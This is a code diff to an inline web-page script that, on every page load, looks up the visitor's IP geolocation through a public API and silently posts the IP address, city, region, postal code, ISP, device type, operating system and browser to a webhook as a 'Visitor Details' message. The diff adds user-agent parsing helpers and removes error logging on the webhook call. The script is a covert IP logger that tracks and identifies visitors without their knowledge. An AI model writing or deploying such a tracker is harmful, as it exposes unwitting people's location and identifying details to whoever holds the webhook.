@@ -1,7 +1,36 @@
 <script>
   const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
 
-  // Fetch full geolocation info
+  // Function to detect device type
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/mobile/i.test(ua)) return "Mobile";
+    if (/tablet/i.test(ua)) return "Tablet";
+    return "Desktop";
+  }
+
+  // Function to detect OS
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "macOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (/Android/i.test(ua)) return "Android";
+    if (/iPhone|iPad/i.test(ua)) return "iOS";
+    return "Unknown";
+  }
+
+  // Function to detect browser
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("Edg")) return "Microsoft Edge";
+    return "Unknown";
+  }
+
+  // Fetch GeoIP data
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
@@ -12,16 +41,15 @@
             title: "Visitor Details",
             color: 5814783,
             fields: [
-              { name: "IP Address", value: data.ip || "Unknown", inline: false },
+              { name: "IP Address", value: data.ip || "Unknown" },
               { name: "Country", value: data.country_name || "Unknown", inline: true },
               { name: "Region", value: data.region || "Unknown", inline: true },
               { name: "City", value: data.city || "Unknown", inline: true },
-              { name: "Postal", value: data.postal || "Unknown", inline: true },
-              { name: "Latitude", value: String(data.latitude) || "Unknown", inline: true },
-              { name: "Longitude", value: String(data.longitude) || "Unknown", inline: true },
-              { name: "ISP / Org", value: data.org || "Unknown", inline: false },
-              { name: "User Agent", value: navigator.userAgent, inline: false },
-              { name: "Language", value: navigator.language, inline: true }
+              { name: "Postal Code", value: data.postal || "Unknown", inline: true },
+              { name: "ISP / Org", value: data.org || "Unknown" },
+              { name: "Device Type", value: getDeviceType(), inline: true },
+              { name: "Operating System", value: getOS(), inline: true },
+              { name: "Browser", value: getBrowser(), inline: true }
             ]
           }
         ]
@@ -31,7 +59,7 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
-      }).catch(err => console.error("Webhook error:", err));
+      });
     })
     .catch(err => console.error("GeoIP error:", err));
 </script>
